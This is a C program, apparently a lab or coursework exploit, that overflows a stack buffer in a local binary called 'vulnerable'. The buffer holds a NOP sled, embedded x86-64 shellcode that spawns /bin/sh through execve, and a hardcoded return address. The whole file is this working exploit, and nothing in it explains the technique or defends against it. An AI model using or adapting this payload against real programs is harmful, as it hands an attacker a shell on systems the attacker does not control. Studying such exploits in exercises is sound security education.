#include <stdio.h>
#include <string.h>
#include <sys/mman.h>
#include <unistd.h>
#include <stdlib.h>

int main(int argc, char* argv[]){

        unsigned long dir = 0x00007fffffffec20;
        char shellcode[] = "\x48\x31\xc0\xb0\x3b\x48\x31\xff\x57\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x57\x48\x89\xe7\x48\x31\xf6\x48\x31\xd2\x0f\x05";
        int len = sizeof(shellcode)-1;
        char buffer[80];
        memset(buffer, 0x90, 80);
        memcpy(buffer+16,shellcode,len);
        memcpy(buffer+72,&dir,sizeof(dir));
        char *path[] = {"/home/adudev/DEV/entregable/vulnerable",buffer,NULL};
        execve(path[0],path,NULL);
        return 0;

}